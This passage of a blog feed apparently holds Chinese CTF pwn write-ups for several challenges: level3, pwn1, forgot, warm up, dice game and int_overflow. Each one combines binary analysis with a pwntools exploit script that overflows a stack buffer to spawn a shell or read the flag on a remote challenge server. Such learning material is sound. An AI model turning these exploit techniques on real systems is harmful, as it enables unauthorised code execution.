运行结果为write_addr=0xf7dfad80为了获取到libc版本这里推荐一个网站https://libc.blukat.me/?q=write%3A0x7f2179c14440。可以在这里通过函数名和地址查询出运行库的版本也提供下载。（如果一个地址查到不止一个库版本可以试着再泄露一个函数) 当然也可以自动获取，这个更可靠，pwntools提供的有库LibcSearcher。由于本人的电脑重装，还没安这个库，所以，没有直接用，而是跟LibcSearcher一样的方式，先泄露然后查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##我选择的是libcsearcher</span></span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write函数和libc泄露，写入system(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>)</span><br><span class="line">main_addr=0x08048484</span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">data=p.recv(4)</span><br><span class="line"><span class="built_in">print</span> hex(u32(data))</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">"./level3"</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a024</span><br><span class="line">plt_read=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">p.recvline()</span><br><span class="line">sleep(1)</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">payload+=p32(system_addr)+p32(0x77777777)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">raw_input() <span class="comment">##raw_input():获取控制台的输入因为前面睡了一秒，所以，通过raw_input()获得控制台的输入，然后输入payload</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">不知道为什么失败了 ，这种题目还是要多做，有点难搞</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn1</title>
    <link href="http://yoursite.com/2019/07/27/pwn1/"/>
    <id>http://yoursite.com/2019/07/27/pwn1/</id>
    <published>2019-07-27T11:14:56.919Z</published>
    <updated>2019-07-27T11:20:25.721Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">很简单的栈溢出 </span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+1h] [rbp-Fh]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">"please input"</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(<span class="string">"ok,bye!!!"</span>);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fun()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不解释，前面有一样的</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'buuoj.cn'</span>,6001)</span><br><span class="line">fun_addr=0x0000000000401186</span><br><span class="line">payload=<span class="string">'a'</span>*0x0f+<span class="string">'a'</span>*8+p64(fun_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="BUUCTF" scheme="http://yoursite.com/categories/BUUCTF/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>forgot</title>
    <link href="http://yoursite.com/2019/07/27/forgot/"/>
    <id>http://yoursite.com/2019/07/27/forgot/</id>
    <published>2019-07-27T11:02:27.671Z</published>
    <updated>2019-07-27T11:13:03.351Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>warm up</title>
    <link href="http://yoursite.com/2019/07/27/warmup/"/>
    <id>http://yoursite.com/2019/07/27/warmup/</id>
    <published>2019-07-27T10:52:55.882Z</published>
    <updated>2019-07-27T11:01:02.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec warmup</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char v5; // [rsp+40h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"-Warm Up-\n"</span>, 0xAuLL);</span><br><span class="line">  write(1, <span class="string">"WOW:"</span>, 4uLL);</span><br><span class="line">  sprintf(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</span><br><span class="line">  write(1, &amp;s, 9uLL);</span><br><span class="line">  write(1, <span class="string">"&gt;"</span>, 1uLL);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gets(&amp;v5, <span class="string">"&gt;"</span>);  栈溢出漏洞利用</span><br><span class="line"></span><br><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system函数</span><br><span class="line"></span><br><span class="line">-0000000000000040 var_40          db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line"></span><br><span class="line">覆盖v5只需要0x48个字节就可以了</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用栈溢出覆盖gets中的v5，写入system函数的地址即可</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">非常简单的64位栈溢出</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,41315)</span><br><span class="line">sys_addr = 0x000000000040060D</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x40+<span class="string">'a'</span>*8+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>dice game</title>
    <link href="http://yoursite.com/2019/07/27/dice%20game/"/>
    <id>http://yoursite.com/2019/07/27/dice game/</id>
    <published>2019-07-27T07:43:54.429Z</published>
    <updated>2019-07-27T10:50:32.062Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190508145639641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf覆盖0x40位就能覆盖到seed</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019050814583223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_A20()如下，就是比较你输入的数是否和产生的随机数相等</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019050814592433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当回答正确50次时，会执行sub_B28这个函数，读取flag。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190508150044523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,56942)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm =[2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*0x40 + p64(0)</span><br><span class="line">p.recvuntil(<span class="string">"know your name: "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> asm:</span><br><span class="line">        p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">        p.send(str(x) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 产生随机数的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">  srand(0);  <span class="comment">##切记一定是0 ，第一次尝试错误了  没有将种子设置为0</span></span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;50;i++)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,"</span>,rand()%6 +1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>int_overflow</title>
    <link href="http://yoursite.com/2019/07/27/int_overflow/"/>
    <id>http://yoursite.com/2019/07/27/int_overflow/</id>
    <published>2019-07-27T07:04:06.396Z</published>
    <updated>2019-07-27T07:41:43.015Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec int_overflow</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/int_overflow'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只开启了nx保护</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/xfgg/xfgg.github.io/master/images/int_overflow1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部，</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow2.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = strlen(s);造成整数溢出的一个点，我们再看一下此处的汇编代码。</span><br></pre></td></tr></table></figure><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow3.png?raw=true" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。 再加上四字节就可以溢出</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们需要进到<span class="keyword">else</span>里，将 <span class="built_in">read</span> 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。</span><br><span class="line">现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈溢出漏洞 加一个整数漏洞</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,44825)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">sys_addr = 0x0804868b</span><br><span class="line">payload = <span class="string">'a'</span>*0x14+<span class="string">'a'</span>*4+p32(sys_addr)</span><br><span class="line">payload = payload.ljust(259,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
